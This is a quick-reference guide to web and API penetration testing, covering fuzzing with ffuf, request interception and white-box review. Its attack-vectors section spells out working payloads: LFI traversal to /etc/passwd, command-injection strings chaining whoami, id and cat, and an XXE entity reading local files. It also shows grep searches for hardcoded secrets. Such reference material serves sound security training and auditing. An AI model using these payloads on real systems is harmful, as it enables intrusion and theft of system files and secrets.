# Web & API Penetration Testing: Quick Reference Guide

## 1. Active Reconnaissance & Fuzzing (Attack Surface Mapping)
In web applications, Nmap takes a back seat. The primary objective is to discover hidden routes, directories, and API endpoints not explicitly linked within the graphical interface.

*   **Directory & File Fuzzing:** Used to locate administrative panels, backups, or configuration files.
    ```bash
    # Directory fuzzing with ffuf using standard Kali Linux wordlists
    ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<TARGET_IP>/FUZZ
    ```
*   **API Fuzzing:** Essential for finding hidden API versions or undocumented endpoints.
    ```bash
    ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt -u http://<TARGET_IP>/api/FUZZ
    ```

## 2. Interception & Manipulation (Proxying)
We replace the browser's Network Tab with **Burp Suite** or **OWASP ZAP** to act as a Man-in-the-Middle. The goal is to capture the raw HTTP request before it reaches the backend server and manipulate its structure.

*   **HTTP Method Tampering:** If an endpoint expects a `GET` request, intercept it and test sending `POST`, `PUT`, or `OPTIONS` to check for misconfigured write/delete functionalities.
*   **Header Manipulation:**
    *   **Content-Type Fuzzing:** Swap `application/json` for `application/xml` or `application/x-www-form-urlencoded` to force parsing errors on the backend.
    *   **Authentication Bypass:** Modify, forge, or drop session Cookies and JWTs (JSON Web Tokens) to verify if the server properly validates cryptographic signatures.

## 3. Source Code Review (White-Box Testing)
A fundamental step if the challenge/audit provides a compressed file containing the source code. Read and map the infrastructure logic before launching any payload.

*   **Hardcoded Secrets Discovery:** Search for hardcoded credentials, tokens, or keys.
    ```bash
    grep -rni "password" .
    grep -rni "API_KEY" .
    ```
*   **Infrastructure Analysis (Docker):** Thoroughly review `Dockerfile` and `docker-compose.yml` files. Look for insecure volume mappings, internal ports accidentally exposed to the host, or containers running with `root` privileges instead of a restricted user.

## 4. Key Attack Vectors (AppSec)
Once the input surface is fully mapped, we manipulate the inputs to break the application's intended logic.

*   **LFI (Local File Inclusion):** Forcing the application to read operating system files through vulnerable URL parameters.
    ```url
    http://<TARGET_IP>/index.php?page=../../../../../../etc/passwd
    ```
*   **Command Injection (CMDi):** Bypassing input sanitization to concatenate OS binaries, ultimately achieving Remote Code Execution (RCE).
    ```bash
    # Payload examples for command concatenation bypass
    127.0.0.1; whoami
    127.0.0.1 && cat flag.txt
    127.0.0.1 | id
    ```
*   **XXE (XML External Entity):** Injecting malicious entities into endpoints that process XML to read local files or force Server-Side Request Forgery (SSRF).
    ```xml
    <!-- XXE payload example to read a local system file -->
    <?xml version="1.0"?>
    <!DOCTYPE data [
    <!ENTITY file SYSTEM "file:///flag.txt">
    ]>
    <data>&file;</data>
    ```
